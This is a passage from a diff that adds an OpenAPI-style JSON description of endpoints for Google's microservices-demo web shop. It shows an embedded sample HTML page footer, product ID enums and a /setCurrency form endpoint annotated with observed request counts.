rel=\"nofollow\" target=\"_blank\" class=\"alert-link\">\n            Air plants for sale. Buy two, get third one for free\n        </a>\n    </div>\n</div>\n\n\n  </div>\n</main>\n\n\n<footer class=\"py-5\">\n    <div class=\"footer-top\">\n        <div class=\"container footer-social\">\n            <p class=\"footer-text\">This website is hosted for demo purposes only. It is not an actual shop. This is not a Google product.</p>\n            <p class=\"footer-text\">\u00a9 2020 Google Inc (<a href=\"https://github.com/GoogleCloudPlatform/microservices-demo\">Source Code</a>)</p>\n            <p class=\"footer-text\">\n                <small>\n                    session-id: 841886e2-da90-4bdd-b5d0-3fa5aacaef04 \u2014 \n                    request-id: 479deb46-6a91-4b72-85d8-d0faa7dee9d4\n                </small>\n            </p>\n        </div>\n    </div>\n</footer>\n<script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\"\n    integrity=\"sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T\" crossorigin=\"anonymous\">\n</script>\n</body>\n\n</html>\n\n"
+       }
+      },
+      "description": "OK"
+     }
+    },
+    "summary": "Seen 458611 requests"
+   },
+   "parameters": [
+    {
+     "in": "path",
+     "name": "href",
+     "required": true,
+     "schema": {
+      "enum": [
+       "1YMWWN1N4O",
+       "L9ECAV7KIM",
+       "6E92ZMYYFZ",
+       "OLJCESPC7Z",
+       "9SIQT8TOJO"
+      ],
+      "type": "string"
+     },
+     "style": "simple"
+    }
+   ]
+  },
+  "/setCurrency": {
+   "parameters": [],
+   "post": {
+    "operationId": "0dfcd298-4653-41c6-840c-93877218d0a6",
+    "parameters": [],
+    "requestBody": {
+     "content": {
+      "application/x-www-form-urlencoded": {
+       "schema": {
+        "properties": {
+         "currency_code": {
+          "type": "string"
+         }
+        },
+        "required": [
+         "currency_code"
+        ],
+        "type": "object"
+       }
+      }
+     },
+     "required": true
+    },
+    "responses": {
+     "302": {
+      "description": "Found"
+     }
+    },
+    "summary": "Seen 70940 requests"
+   }
+  }
+ },
+ "tags": [
+  {
+   "name": "cart"
+  }
+ ]
+}
